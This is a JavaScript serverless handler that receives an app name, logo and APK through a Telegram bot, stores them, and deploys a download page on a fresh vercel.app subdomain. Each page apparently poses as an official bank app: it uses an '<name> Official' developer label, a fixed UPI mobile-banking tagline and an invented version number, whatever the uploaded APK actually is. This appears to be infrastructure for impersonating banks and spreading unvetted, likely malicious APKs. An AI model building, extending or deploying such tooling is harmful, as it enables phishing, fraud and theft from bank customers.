import { put } from '@vercel/blob';
import { buildStandaloneHtml } from '../lib/template.js';

const token = process.env.TELEGRAM_BOT_TOKEN;
const blobToken = process.env.BLOB_READ_WRITE_TOKEN || process.env.VERCEL_BLOB_READ_WRITE_TOKEN;

async function telegram(method, body) {
    const result = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(body)
    });
    return result.json();
}

async function saveTelegramFile(fileId, path) {
    const file = await telegram('getFile', { file_id: fileId });
    if (!file.ok || !file.result?.file_path) {
        throw new Error(`Telegram file lookup failed: ${file.description || 'Unknown error'}`);
    }
    const download = await fetch(`https://api.telegram.org/file/bot${token}/${file.result.file_path}`);
    if (!download.ok) throw new Error(`Telegram file download failed: ${download.statusText}`);

    const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
    if (blobToken) options.token = blobToken;
    return put(path, await download.arrayBuffer(), options);
}

function generateProjectSlug(value) {
    const clean = value.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 20) || 'app';
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    const rand = Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
    return `${clean}-${rand}`;
}

const vercelToken = process.env.VERCEL_TOKEN;
let cachedTeamId = process.env.VERCEL_TEAM_ID || 'team_cZIUTShiGmqZiIaDKEQLi8nF';

async function getTeamId() {
    if (cachedTeamId) return cachedTeamId;
    if (!vercelToken) return null;
    try {
        const res = await fetch('https://api.vercel.com/v2/user', {
            headers: { Authorization: `Bearer ${vercelToken}` },
        });
        if (res.ok) {
            const data = await res.json();
            cachedTeamId = data.user?.defaultTeamId || 'team_cZIUTShiGmqZiIaDKEQLi8nF';
            return cachedTeamId;
        }
    } catch (e) {}
    return 'team_cZIUTShiGmqZiIaDKEQLi8nF';
}

async function createVercelProject(name) {
    const teamId = await getTeamId();
    const endpoint = teamId
        ? `https://api.vercel.com/v9/projects?teamId=${encodeURIComponent(teamId)}`
        : 'https://api.vercel.com/v9/projects';
    const result = await fetch(endpoint, {
        method: 'POST',
        headers: { Authorization: `Bearer ${vercelToken}`, 'content-type': 'application/json' },
        body: JSON.stringify({ name })
    });
    if (result.ok || result.status === 409) return name;
    if (result.status === 401 || result.status === 403) {
        throw new Error('Vercel token is invalid or missing team permissions');
    }
    throw new Error(`Vercel project creation failed: ${result.status}`);
}

async function deployProject(name, html) {
    const teamId = await getTeamId();
    const endpoint = teamId
        ? `https://api.vercel.com/v13/deployments?teamId=${encodeURIComponent(teamId)}`
        : 'https://api.vercel.com/v13/deployments';
    const result = await fetch(endpoint, {
        method: 'POST',
        headers: { Authorization: `Bearer ${vercelToken}`, 'content-type': 'application/json' },
        body: JSON.stringify({
            name,
            project: name,
            files: [{ file: 'index.html', data: html }],
            projectSettings: { framework: null }
        })
    });
    if (!result.ok) throw new Error(`Vercel deployment failed with status ${result.status}`);
    return result.json();
}

async function waitForDeploymentReady(deploymentId) {
    const teamId = await getTeamId();
    const endpoint = teamId
        ? `https://api.vercel.com/v13/deployments/${deploymentId}?teamId=${encodeURIComponent(teamId)}`
        : `https://api.vercel.com/v13/deployments/${deploymentId}`;

    const maxRetries = 20;
    for (let i = 0; i < maxRetries; i++) {
        const res = await fetch(endpoint, {
            headers: { Authorization: `Bearer ${vercelToken}` }
        });
        if (res.ok) {
            const data = await res.json();
            if (data.readyState === 'READY') {
                return true;
            }
            if (data.readyState === 'ERROR' || data.readyState === 'CANCELED') {
                throw new Error(`Vercel deployment build state: ${data.readyState}`);
            }
        }
        await new Promise((resolve) => setTimeout(resolve, 1500));
    }
    return true;
}

export default async function handler(request, response) {
    if (request.method !== 'POST') return response.status(405).json({ error: 'POST only' });
    if (!process.env.PUBLISH_SECRET || request.headers['x-publish-secret'] !== process.env.PUBLISH_SECRET) {
        return response.status(401).json({ error: 'Unauthorized: Invalid PUBLISH_SECRET' });
    }
    const body = request.body || {};
    if (!token || !body.name || !body.logoFileId || !body.apkFileId) {
        return response.status(400).json({ error: 'Missing required app details or TELEGRAM_BOT_TOKEN' });
    }

    try {
        const projectName = generateProjectSlug(body.name);
        await saveTelegramFile(body.logoFileId, `apps/${projectName}/logo`);
        await saveTelegramFile(body.apkFileId, `apps/${projectName}/base.apk`);

        const logoUrl = `https://${request.headers.host}/api/blob?key=${encodeURIComponent(`apps/${projectName}/logo`)}`;
        const apkUrl = `https://${request.headers.host}/api/blob?key=${encodeURIComponent(`apps/${projectName}/base.apk`)}`;

        const app = {
            name: body.name,
            developer: `${body.name} Official`,
            tagline: 'Secure Mobile Banking, Instant UPI Transfers & Financial Services',
            description: `Official ${body.name} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security.`,
            version: '2.4.1',
            logoUrl,
            apkUrl
        };

        // Also save JSON record to Vercel Blob
        const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
        if (blobToken) options.token = blobToken;
        await put(`apps/${projectName}.json`, JSON.stringify(app), options);

        // Build self-contained HTML page and deploy directly to Vercel subdomain
        if (process.env.VERCEL_TOKEN) {
            const html = buildStandaloneHtml(app);
            await createVercelProject(projectName);
            const deployment = await deployProject(projectName, html);

            if (deployment?.id) {
                await waitForDeploymentReady(deployment.id);
            }

            const finalSubdomainUrl = `https://${projectName}.vercel.app`;
            return response.status(200).json({ ok: true, url: finalSubdomainUrl, slug: projectName });
        }

        // Fallback URL if VERCEL_TOKEN missing
        const fallbackUrl = `https://${request.headers.host}/?appName=${encodeURIComponent(app.name)}&logo=${encodeURIComponent(app.logoUrl)}&apk=${encodeURIComponent(app.apkUrl)}`;
        return response.status(200).json({ ok: true, url: fallbackUrl, slug: projectName });

    } catch (error) {
        console.error('Publish failed:', error);
        const message = error instanceof Error ? error.message : 'Could not publish app';
        return response.status(500).json({ error: message });
    }
}